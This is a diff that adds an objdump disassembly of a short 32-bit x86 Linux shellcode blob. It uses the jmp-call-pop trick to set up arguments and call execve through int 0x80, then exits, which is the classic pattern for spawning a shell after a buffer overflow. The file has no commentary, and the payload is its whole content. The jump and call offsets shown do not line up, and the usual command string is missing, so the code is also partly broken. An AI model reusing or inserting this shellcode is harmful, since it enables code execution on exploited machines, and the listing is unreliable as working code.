@@ -1,0 +1,21 @@
+
+bin:     file format binary
+
+
+Disassembly of section .data:
+
+00000000 <.data>:
+   0:	e9 26 00 00 00       	jmp    0x2b
+   5:	5e                   	pop    esi
+   6:	89 76 08             	mov    DWORD PTR [esi+0x8],esi
+   9:	c6 46 07 00          	mov    BYTE PTR [esi+0x7],0x0
+   d:	c7 46 0c 00 00 00 00 	mov    DWORD PTR [esi+0xc],0x0
+  14:	b8 0b 00 00 00       	mov    eax,0xb
+  19:	89 f3                	mov    ebx,esi
+  1b:	8d 4e 08             	lea    ecx,[esi+0x8]
+  1e:	8d 56 0c             	lea    edx,[esi+0xc]
+  21:	cd 80                	int    0x80
+  23:	b8 01 00 00 00       	mov    eax,0x1
+  28:	bb 00 00 00 00       	mov    ebx,0x0
+  2d:	cd 80                	int    0x80
+  2f:	e8 cd ff ff ff       	call   0x1
